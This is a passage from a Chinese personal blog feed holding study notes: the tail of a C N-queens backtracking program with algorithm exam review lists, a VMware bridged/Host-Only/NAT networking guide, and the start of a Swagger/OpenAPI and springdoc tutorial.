class="hljs-keyword">if</span> (<span class="hljs-built_in">row</span> &gt; N) &#123;                            <span class="hljs-comment">// 如果已经放满了 N 行，找到解了</span><br>        solutions++;<br>        printSolution();                      <span class="hljs-comment">// 打印当前解的棋盘</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-built_in">col</span> = <span class="hljs-number">1</span>; <span class="hljs-built_in">col</span> &lt;= N; <span class="hljs-built_in">col</span>++) &#123;      <span class="hljs-comment">// 如果还没有放满，尝试在本行的每一列中寻找合法位置</span><br>        <span class="hljs-keyword">if</span> (isSafe(<span class="hljs-built_in">row</span>, <span class="hljs-built_in">col</span>)) &#123;<br>queen[<span class="hljs-built_in">row</span>] = <span class="hljs-built_in">col</span>;                 <span class="hljs-comment">// 放置皇后</span><br>            backtrack(<span class="hljs-built_in">row</span> + <span class="hljs-number">1</span>);               <span class="hljs-comment">// 递归下一行</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> main() &#123;<br>    backtrack(<span class="hljs-number">1</span>);                             <span class="hljs-comment">// 从第 1 行开始放皇后</span><br>    printf(<span class="hljs-string">&quot;4 皇后问题共有 %d 种解法。\n&quot;</span>, solutions);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="5-最长公共子序列"><a href="#5-最长公共子序列" class="headerlink" title="5. 最长公共子序列"></a>5. 最长公共子序列</h3><h4 id="5-1-题目描述"><a href="#5-1-题目描述" class="headerlink" title="5.1. 题目描述"></a>5.1. 题目描述</h4><p>以 CBDABCC 和 CABACC 为例，计算出一个最长公共子序列</p><hr><h4 id="5-2-动态规划法"><a href="#5-2-动态规划法" class="headerlink" title="5.2. 动态规划法"></a>5.2. 动态规划法</h4><ol><li>分治法、贪心法、动态规划法（画表）、回溯法（画树）、分支限界法（排序、画树）</li><li>有穷性、确定性、可行性、输入、输出</li><li>问题规模、输入序列、算法本身</li><li>1    logn    n    nlogn   n^2    n^3    2^n    n!    n^n</li><li></li><li>队列式分支限界法、优先队列式分支限界法</li><li>传递性、加法、乘法</li><li></li><li>将一个问题分解为多个规模较小、相互独立、类型相同的子问题，递归地求解这些问题，然后将子问题的解组合成原问题</li><li>规模较小、相互独立、类型相同</li><li></li><li>n-1    表格画法   O(n^2)</li><li>最优子结构，贪心选择性质</li><li>θ（nlogn）</li><li></li><li></li><li>通过减少乘法次数来减少子问题的个数</li><li></li><li></li><li>最优子结构，重叠子问题，无后效性</li><li>动态规划法，表格怎么画？</li><li>动态规划法，表格怎么画？</li><li>贪心法，画表格</li><li>θ（nlogn）</li><li>θ（nlogn）</li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li>所求问题的整体最优解可以通过一系列局部最优解来达到</li><li>深度优先搜索 + 剪枝函数</li><li>问题的最优解包含其子问题的最优解</li><li>子集树、排列树</li><li>子集树</li><li>排列树</li><li>分数：贪心，01 除了贪心都可以，完全动态规划、分支限界</li><li>排列树</li><li>时间复杂性、空间复杂性</li><li>算法中元运算的执行次数</li><li>子问题的个数    子问题的规模     将规模为 n 的问题分解为子问题以及组合相应的子问题的解所需要的时间</li><li>分解、递归、组合</li><li>蛮力法、辗转相除法</li></ol><p>背代码其实就贪心法（如果没有遍历完且还有容量，考虑能不能直接放下）、动态规划法（直接逐行逐列遍历）、回溯法（如果遍历完比较价值，如果没遍历完考虑能不能放下）求解背包问题，还有个回溯法求 n 皇后</p><h1 id="背诵"><a href="#背诵" class="headerlink" title="背诵"></a>背诵</h1><ol><li>五大方法，一般怎么解决问题？</li><li>算法的五大基本性质</li><li>影响时间复杂度的因素有</li><li>常见时间复杂度</li><li>三种渐进符号，图像又该怎么画</li><li>常见两种分支限界法为</li><li>渐进符号二级结论</li><li>Hanoi 塔</li><li>分治法的思想</li><li>分治法的性质</li><li>主方法求时间复杂度</li><li>循环赛问题，需要几天，表格怎么画，分治法公式是，时间复杂度是</li><li>贪心法的性质</li><li>快速排序问题，如何做，时间复杂度</li><li>Strass 矩阵相乘问题，分治法公式是，时间复杂度是</li><li>大整数相乘问题，分治法公式是，时间复杂度是</li><li>上面两个问题是如何优化的</li><li>二分查找问题，如何做，时间复杂度</li><li>归并排序问题，如何做，时间复杂度</li><li>动态规划法的性质</li><li><strong>矩阵链乘法问题，如何做（1-n）</strong></li><li><strong>最长公共子序列问题，如何做（0-末）</strong></li><li><strong>单源最短路径问题，如何做（2-终点集）</strong></li><li><strong>分数背包问题，如何做，时间复杂度，</strong><font color="#ff0000">代码呢</font></li><li><strong>活动会场安排问题，如何做，时间复杂度</strong></li><li><strong>最优装载问题，如何做</strong></li><li><strong>图的 m 着色问题，如何做</strong></li><li><strong>移动货郎问题，如何做</strong></li><li><strong>0&#x2F;1 背包问题，如何做</strong>，<font color="#ff0000">代码呢</font></li><li><strong>n 皇后问题，如何做</strong>，<font color="#ff0000">代码呢</font></li><li>蒙特卡罗方法，如何做</li><li><strong>最小生成树问题，</strong>如何做</li><li><strong>哈夫曼编码问题，</strong>如何做</li><li><strong>完全背包问题，</strong>如何做，<font color="#ff0000">代码呢</font></li><li><strong>K-NN 如何解题</strong></li><li><strong>K-Means 如何解题</strong></li><li>贪心选择性质是什么</li><li>回溯法是什么？</li><li>最优子结构性质是什么？</li><li>回溯法的解空间结构一般分为？</li><li>0&#x2F;1 背包的解空间结构为？</li><li>n 皇后的解空间结构为？</li><li>背包问题可以由哪些方法求解？</li><li>旅行售货员的解空间结构为？</li><li>算法的复杂性分为</li><li>算法的时间复杂性指的是</li><li>主方法中的几个符号分别的含义是</li><li>分治法的基本步骤</li><li>求最大公约数一般会使用什么方法</li><li>记住：霍夫曼编码和海明码是用来压缩和纠错的</li></ol>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：VMware</title>
    <link href="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/"/>
    <url>/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/</url>
    
    <content type="html"><![CDATA[<h3 id="1-三种网络模式"><a href="#1-三种网络模式" class="headerlink" title="1. 三种网络模式"></a>1. 三种网络模式</h3><h4 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1. 前言"></a>1.1. 前言</h4><p>当 VMware 软件安装完成之后，会在电脑上虚拟出三块虚拟交换机和两块虚拟网卡：</p><p>&#x3D;&#x3D;1.虚拟交换机&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416081037992.png"></p><p>&#x3D;&#x3D;2.虚拟网卡&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416081010029.png"></p><hr><h3 id="2-桥接模式"><a href="#2-桥接模式" class="headerlink" title="2. 桥接模式"></a>2. 桥接模式</h3><p><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416104756062.png"></p><hr><h3 id="3-Host-Only-模式"><a href="#3-Host-Only-模式" class="headerlink" title="3. Host-Only 模式"></a>3. Host-Only 模式</h3><h4 id="3-1-Host-Only-模式概述"><a href="#3-1-Host-Only-模式概述" class="headerlink" title="3.1. Host-Only 模式概述"></a>3.1. Host-Only 模式概述</h4><p><strong>Host-Only 模式</strong> 主要用于构建一个与外部网络隔离的虚拟网络环境。</p><p>在该模式下，虚拟机只能与宿主机及同样处于 Host-Only 网络中的其他虚拟机通信，<strong>但是虚拟机无法访问外网，外网也无法访问虚拟机</strong>。  </p><p>这种模式非常适合用于搭建内网测试环境，尤其在不希望虚拟机连接互联网或被外部访问的场景中尤为实用。</p><hr><h4 id="3-2-Host-Only-模式流程"><a href="#3-2-Host-Only-模式流程" class="headerlink" title="3.2. Host-Only 模式流程"></a>3.2. Host-Only 模式流程</h4><ol><li>&#x3D;&#x3D;主机访问虚拟机&#x3D;&#x3D;：<ol><li>请求 -&gt; VMware Network Adapter VMnet1 网卡（192.168.62.4）-&gt; VMnet1 虚拟交换机 -&gt;具体虚拟机</li></ol></li><li>&#x3D;&#x3D;虚拟机访问外部网络&#x3D;&#x3D;：<ol><li>🚫很抱歉，Host-Only 模式下，虚拟机是无法访问互联网的。<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416102940107.png"></li></ol></li></ol><hr><h4 id="3-3-实现-Host-Only-模式"><a href="#3-3-实现-Host-Only-模式" class="headerlink" title="3.3. 实现 Host-Only 模式"></a>3.3. 实现 Host-Only 模式</h4><h5 id="3-3-1-配置-Vment1-虚拟交换机"><a href="#3-3-1-配置-Vment1-虚拟交换机" class="headerlink" title="3.3.1. 配置 Vment1 虚拟交换机"></a>3.3.1. 配置 Vment1 虚拟交换机</h5><p>&#x3D;&#x3D;1.点击 编辑 -&gt;-&gt;-&gt; 虚拟网络编译器&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250315102345834.png"></p><p>&#x3D;&#x3D;2.进入虚拟网络编辑器设置&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103052179.png"></p><p>&#x3D;&#x3D;3. 配置Host-Only&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103438010.png"></p><hr><h5 id="3-3-2-配置-VMware-Network-Adapter-VMent1-网卡"><a href="#3-3-2-配置-VMware-Network-Adapter-VMent1-网卡" class="headerlink" title="3.3.2. 配置 VMware Network Adapter VMent1 网卡"></a>3.3.2. 配置 VMware Network Adapter VMent1 网卡</h5><p>&#x3D;&#x3D;1.进入 IPV4 属性配置&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103242575.png"></p><p>&#x3D;&#x3D;2.配置 IPV4 属性&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103521709.png"></p><hr><h5 id="3-3-3-配置虚拟机-ens33"><a href="#3-3-3-配置虚拟机-ens33" class="headerlink" title="3.3.3. 配置虚拟机 ens33"></a>3.3.3. 配置虚拟机 ens33</h5><p>&#x3D;&#x3D;1.为虚拟机添加 NAT 网卡（ens37）&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103617846.png"></p><p>&#x3D;&#x3D;2.配置 ens37&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103933146.png"></p><hr><h3 id="4-NAT-模式"><a href="#4-NAT-模式" class="headerlink" title="4. NAT 模式"></a>4. NAT 模式</h3><h4 id="4-1-NAT-模式概述"><a href="#4-1-NAT-模式概述" class="headerlink" title="4.1. NAT 模式概述"></a>4.1. NAT 模式概述</h4><p>在 NAT 模式下，虚拟机通过宿主机的网卡进行网络访问，实际上是通过宿主机充当一个<strong>反向代理</strong>。这样，外部网络能够访问虚拟机，同时虚拟机也能访问外部网络。</p><hr><h4 id="4-2-NAT-模式流程"><a href="#4-2-NAT-模式流程" class="headerlink" title="4.2. NAT 模式流程"></a>4.2. NAT 模式流程</h4><ol><li>&#x3D;&#x3D;主机访问虚拟机&#x3D;&#x3D;：<ol><li>请求 -&gt; VMware Network Adapter VMent8 网卡（192.168.62.4） -&gt; Vment8 虚拟交换机 -&gt; 具体虚拟机</li></ol></li><li>&#x3D;&#x3D;虚拟机访问外部网络&#x3D;&#x3D;：<ol><li>请求 -&gt; 网关（虚拟 NAT 设备，192.168.62.2）-&gt; 主机网卡</li><li>也就是说，虚拟机的请求会先通过主机的 IP，再由主机访问外部网络，相当于主机做了个反向代理</li></ol></li></ol><p><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416091811203.png"></p><hr><h4 id="4-3-实现-NAT"><a href="#4-3-实现-NAT" class="headerlink" title="4.3. 实现 NAT"></a>4.3. 实现 NAT</h4><h5 id="4-3-1-配置-Vment8-虚拟交换机"><a href="#4-3-1-配置-Vment8-虚拟交换机" class="headerlink" title="4.3.1. 配置 Vment8 虚拟交换机"></a>4.3.1. 配置 Vment8 虚拟交换机</h5><p>&#x3D;&#x3D;1.点击 编辑 -&gt;-&gt;-&gt; 虚拟网络编译器&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250315102345834.png"></p><p>&#x3D;&#x3D;2.进入虚拟网络编辑器设置&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416103059206.png"></p><p>&#x3D;&#x3D;3.进行 NAT 配置&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416093922129.png"></p><p>&#x3D;&#x3D;4.配置 NAT 网关&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416094237485.png"></p><hr><h5 id="4-3-2-配置-VMware-Network-Adapter-VMent8-网卡"><a href="#4-3-2-配置-VMware-Network-Adapter-VMent8-网卡" class="headerlink" title="4.3.2. 配置 VMware Network Adapter VMent8 网卡"></a>4.3.2. 配置 VMware Network Adapter VMent8 网卡</h5><p>&#x3D;&#x3D;1.进入 IPV4 属性配置&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416094344342.png"></p><p>&#x3D;&#x3D;2.配置 IPV4 属性&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416094700930.png"></p><hr><h5 id="4-3-3-配置虚拟机-ens33"><a href="#4-3-3-配置虚拟机-ens33" class="headerlink" title="4.3.3. 配置虚拟机 ens33"></a>4.3.3. 配置虚拟机 ens33</h5><p>&#x3D;&#x3D;1.为虚拟机添加 NAT 网卡（ens33）&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416101054447.png"></p><p>&#x3D;&#x3D;2.配置 ens33&#x3D;&#x3D;<br><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250416100814721.png"></p><hr><h3 id="添加磁盘"><a href="#添加磁盘" class="headerlink" title="添加磁盘"></a>添加磁盘</h3><p><img src="/2025/04/15/%E7%AC%94%E8%AE%B0%EF%BC%9AVMware/image-20250514114944277.png"></p>]]></content>
    
    
    <categories>
      
      <category>虚拟化</category>
      
      <category>VMware</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 文档</title>
    <link href="/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%96%87%E6%A1%A3/"/>
    <url>/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-Swagger"><a href="#1-Swagger" class="headerlink" title="1. Swagger"></a>1. Swagger</h3><h4 id="1-1-Swagger-概述"><a href="#1-1-Swagger-概述" class="headerlink" title="1.1. Swagger 概述"></a>1.1. Swagger 概述</h4><p>Swagger 可以概括为 Swagger 规范（如何定义 API）+ Swagger 工具链（辅助开发和文档生成）。它涵盖了 API 开发的整个生命周期：设计、实现、测试、文档生成，是现代 RESTful API 开发的主流解决方案</p><hr><h4 id="1-2-Swagger-规范"><a href="#1-2-Swagger-规范" class="headerlink" title="1.2. Swagger 规范"></a>1.2. Swagger 规范</h4><p>Swagger 规范是一种描述 RESTful API 的规范，它允许开发者以机器可读的格式（<font color="#ff0000">通常是 JSON 或 YAML</font>）定义 API 的接口、操作、请求、响应、认证方式以及其他相关信息，<font color="#ff0000">这种文件一般叫做 Swagger 文件（OpenAPI 文件、API 文档）。</font></p><p>在 2016 年，Swagger 规范被捐赠给了 <strong>OpenAPI Initiative</strong>，成为一个开放的标准，并更名为 **OpenAPI Specification (OAS)**。OpenAPI 现在已经成为 RESTful API 领域的一个广泛接受的标准。</p><p>可以简单地理解为，Swagger 2.0 对应的是 Swagger 规范，而 Swagger 3.0 则对应 OpenAPI 规范。</p><hr><h4 id="1-3-Swagger-工具链"><a href="#1-3-Swagger-工具链" class="headerlink" title="1.3. Swagger 工具链"></a>1.3. Swagger 工具链</h4><h5 id="1-3-1-Swagger-UI"><a href="#1-3-1-Swagger-UI" class="headerlink" title="1.3.1. Swagger UI"></a>1.3.1. Swagger UI</h5><p>Swagger UI 能根据 API 文档提供一个交互式的 API 文档界面，用户可以直接通过浏览器进行 API 的测试和查看，其使用方法是：</p><p>&#x3D;&#x3D;1.引入 springfox-swagger-ui 依赖&#x3D;&#x3D;<br>引入 <a href="https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui">springfox-swagger-ui 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.输入访问 Swagger UI 的 URL&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8080/swagger-ui.html<br></code></pre></td></tr></table></figure><hr><h4 id="1-4-Swagger-Editor"><a href="#1-4-Swagger-Editor" class="headerlink" title="1.4. Swagger Editor"></a>1.4. Swagger Editor</h4><p>Swagger Editor 是一个<a href="https://editor.swagger.io/">在线编译器</a>，用于编写和查看 Swagger 规范文件（Swagger 2.0 或 OpenAPI 3.0 格式）。</p><hr><h3 id="2-API-文档的书写方式"><a href="#2-API-文档的书写方式" class="headerlink" title="2. API 文档的书写方式"></a>2. API 文档的书写方式</h3><h4 id="2-1-手写-API-文档"><a href="#2-1-手写-API-文档" class="headerlink" title="2.1. 手写 API 文档"></a>2.1. 手写 API 文档</h4><p>手写 OpenAPI 文档是指开发者自己手动编写符合 OpenAPI 规范的 YAML 或 JSON 文件，以描述 API 的结构、路径、请求、响应等，例如：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">openapi</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3.0.0</span><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">title</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Sample API</span><br>  <span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1.0.0</span><br><span class="hljs-attribute">paths</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">/users</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">get</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">summary</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Get a list of users</span><br>      <span class="hljs-attribute">responses</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">&#x27;200&#x27;</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A list of users</span><br>          <span class="hljs-attribute">content</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">application/json</span><span class="hljs-punctuation">:</span><br>              <span class="hljs-attribute">schema</span><span class="hljs-punctuation">:</span><br>                <span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">array</span><br>                <span class="hljs-attribute">items</span><span class="hljs-punctuation">:</span><br>                  <span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">object</span><br>                  <span class="hljs-attribute">properties</span><span class="hljs-punctuation">:</span><br>                    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span><br>                      <span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">integer</span><br>                    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span><br>                      <span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">string</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-2-自动生成-API-文档"><a href="#2-2-自动生成-API-文档" class="headerlink" title="2.2. 自动生成 API 文档"></a>2.2. 自动生成 API 文档</h4><p>自动生成 API 文档是指通过<strong>文档框架</strong>（如 Springfox 或 Spring Doc）通过注解自动生成 API 文档，一般我们使用这种方式。</p><hr><h3 id="3-API-文档的下载方式"><a href="#3-API-文档的下载方式" class="headerlink" title="3. API 文档的下载方式"></a>3. API 文档的下载方式</h3><p>&#x3D;&#x3D;1.JSON 类型文档&#x3D;&#x3D;<br>在 IDEA 中下载插件 <code>OpenAPI Specifications</code>，可以右键 <code>Export OpenAPI</code> 导出 JSON 类型的 API 文档<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250413223859767.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250413223920691.png"></p><p>&#x3D;&#x3D;2.YAML 类型文档&#x3D;&#x3D;</p><p>访问 <a href="http://localhost:8080/v3/api-docs.yaml">http://localhost:8080/v3/api-docs.yaml</a></p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-使用-Springfox-生成-Swagger-2-0-文档"><a href="#1-使用-Springfox-生成-Swagger-2-0-文档" class="headerlink" title="1. 使用 Springfox 生成 Swagger 2.0 文档"></a>1. 使用 Springfox 生成 Swagger 2.0 文档</h3><h4 id="1-1-引入相关依赖"><a href="#1-1-引入相关依赖" class="headerlink" title="1.1. 引入相关依赖"></a>1.1. 引入相关依赖</h4><p>引入 <a href="https://mvnrepository.com/artifact/io.springfox/springfox-swagger2">springfox-swagger2 依赖</a>、<a href="https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui">springfox-swagger-ui 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Swagger 2 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Swagger UI --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-2-标注相关注解"><a href="#1-2-标注相关注解" class="headerlink" title="1.2. 标注相关注解"></a>1.2. 标注相关注解</h4><p>由于当前开发主要使用 springdoc，因此关于 Springfox 的讲解暂时暂停，之后不再提供相关信息。</p><hr><h3 id="2-使用-Springdoc-生成-OpenAPI-文档"><a href="#2-使用-Springdoc-生成-OpenAPI-文档" class="headerlink" title="2. 使用 Springdoc 生成 OpenAPI 文档"></a>2. 使用 Springdoc 生成 OpenAPI 文档</h3><h4 id="2-1-代码结构目录"><a href="#2-1-代码结构目录" class="headerlink" title="2.1. 代码结构目录"></a>2.1. 代码结构目录</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Spring_Data_MySQL<br>├── src<br>│   └── main<br>│       ├── java<br>│       │   └── com.example.spring_data_mybatis<br>│       │       ├── Application.java                          <span class="hljs-comment">// 项目启动类</span><br>│       │       ├── config<br>|       |       |   └──OpenApiConfig                          <span class="hljs-comment">// OpenAPI 配置文件</span><br>│       │       └── controller<br>│       │           └── TestController.java                   <span class="hljs-comment">// TestController 类</span><br>│       └── resources<br></code></pre></td></tr></table></figure><hr><h4 id="2-2-创建-Spring-Web-项目"><a href="#2-2-创建-Spring-Web-项目" class="headerlink" title="2.2. 创建 Spring Web 项目"></a>2.2. 创建 Spring Web 项目</h4><p>这里采用 IDEA 提供的脚手架创建 Spring Web 项目，分别勾选：</p><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li></ol><hr><h4 id="2-3-引入相关依赖"><a href="#2-3-引入相关依赖" class="headerlink" title="2.3. 引入相关依赖"></a>2.3. 引入相关依赖</h4><p>引入 <a href="https://mvnrepository.com/artifact/org.springdoc/springdoc-openapi-starter-webmvc-ui">spring-openapi-stater-webmvc-ui 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- SpringDoc OpenAPI 依赖，会自动引入 Swagger UI 依赖 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springdoc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 根据需要选择版本 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-4-准备测试代码"><a href="#2-4-准备测试代码" class="headerlink" title="2.4. 准备测试代码"></a>2.4. 准备测试代码</h4><p>&#x3D;&#x3D;1.AdminController.java&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 